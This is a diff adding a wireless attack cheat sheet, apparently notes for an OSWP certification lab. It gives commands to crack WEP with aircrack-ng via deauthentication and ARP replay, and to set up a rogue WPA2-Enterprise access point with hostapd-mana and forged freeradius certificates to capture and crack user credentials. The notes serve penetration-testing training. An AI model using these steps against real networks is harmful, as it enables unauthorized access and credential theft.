@@ -1,0 +1,89 @@
+# Credit: drewlong
+# Attacking WEP
+
+Prepare the monitoring interface:
+airmon-ng check kill
+airmon-ng start wlan0
+
+Setup a listener to catch traffic:
+airodump-ng --bssid <BSSID> -c <CHANNEL> -w <OUTFILE> wlan0mon
+
+Deauthenticate to generate some data and reveal clients:
+aireplay-ng -0 0 -a <BSSID> wlan0mon
+
+Fake authentication to generate IVs:
+aireplay-ng -1 6 -e <SSID> -a <BSSID> -h <CLIENT MAC> wlan0mon
+
+Use ARP Replay to catch and replay ARP packets, which will generate more data / IVs:
+aireplay-ng -3 -b <BSSID> -h <CLIENT MAC> wlan0mon
+
+
+Start running aircrack on the PCAP file to crack it:
+aircrack-ng <capture file>
+
+Connect to the network -> defer to https://github.com/CommodoreAlex/OSWP/blob/main/Connecting%20to%20APs
+
+# Attacking WPA2 Enterprise
+
+Look for WPA MGT network in airodump:
+airodump-ng wlan0mon
+
+Grab cert files from wireshark traffic using `tls.handshake.type == 11,3` or `tls.handshake.certificate` filters:
+* View packet details -> TLSv1 Record Layer: Handshake Protocol: Certificate
+* Save certificates to file, right click cert string and click export packet bytes.
+
+View SSL cert info:
+openssl x509 -inform der -in CERTIFICATE_FILENAME -text
+
+Use freeradius to provide fake cert to clients:
+* Alter certificate authority block in /etc/freeradius/3.0/certs/ca.cnf:
+    [certificate_authority]
+    countryName             = US
+    stateOrProvinceName     = {2 letter state}
+    localityName            = {City}
+    organizationName        = {Company Name}
+    emailAddress            = {Email}
+    commonName              = "Such and Such Certificate Authority"
+	
+Alter server block in /etc/freeradius/3.0/certs/server.cnf:
+    [server]
+    countryName             = US
+    stateOrProvinceName     = {2 letter state}
+    localityName            = {City}
+    organizationName        = {Company Name}
+    emailAddress            = {Email}
+    commonName              = "Such and Such Certificate Authority"
+	
+Change directory to /etc/freeradius/3.0/certs/ and run:
+rm dh && make
+
+An error will appear, disregard the error.
+
+Setup hostapd-mana for the rogue AP using the mana.conf file, move to /etc/hostapd-mana/mana.conf
+
+Use mana.eap_user file, move to /etc/hostapd-mana/mana.eap_user
+
+Start hostapd-mana:
+
+hostapd-mana /etc/hostapd-mana/mana.conf
+Hostapd-mana will output asleap commands, find a user with a successful login (from wireshark traffic) and run command like so:
+
+<asleap command> -W /usr/share/john/password.lst
+
+Create wpa_supplicant.conf file:
+
+network={
+  ssid="NetworkName"
+  scan_ssid=1
+  key_mgmt=WPA-EAP
+  identity="Domain\username"
+  password="password"
+  eap=PEAP
+  phase1="peaplabel=0"
+  phase2="auth=MSCHAPV2"
+}
+Connect to network:
+
+wpa_supplicant -c <config file>
+
+Don't forget the grab and submit the proof.
